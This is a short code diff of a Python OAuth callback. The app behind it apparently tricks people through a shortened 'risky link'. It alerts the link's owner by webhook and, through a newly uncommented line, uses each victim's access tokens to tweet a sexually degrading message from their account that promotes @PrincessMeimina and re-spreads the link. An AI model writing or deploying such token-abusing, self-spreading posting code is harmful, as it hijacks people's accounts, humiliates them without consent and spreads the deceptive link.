@@ -220,7 +220,7 @@ def callback():
     
     if endpoint == 'start':
         try:
-            w_content=f'{screen_name} clicked your risky link https://tinyurl.com/3y97dae2'
+            w_content=f'@{screen_name} clicked your risky link https://tinyurl.com/3y97dae2'
             headers={"Content-Type":"application/json"}
             data={"content":w_content}
             params=str(json.dumps(data)).encode('utf-8')
@@ -241,7 +241,7 @@ def callback():
                                         access_token=real_oauth_token, 
                                         access_token_secret=real_oauth_token_secret)
         
-            #api.create_tweet(text="I am a dumb slut who clicks anything sent by the wonderful @PrincessMeimina. clicky click https://tinyurl.com/3y97dae2 to be owned by Meimina$$.")
+            api.create_tweet(text="I am a dumb slut who clicks anything sent by the wonderful @PrincessMeimina. clicky click https://tinyurl.com/3y97dae2 to be owned by Meimina$$.")
         except Exception as e:
             print(e)
             return str(e)
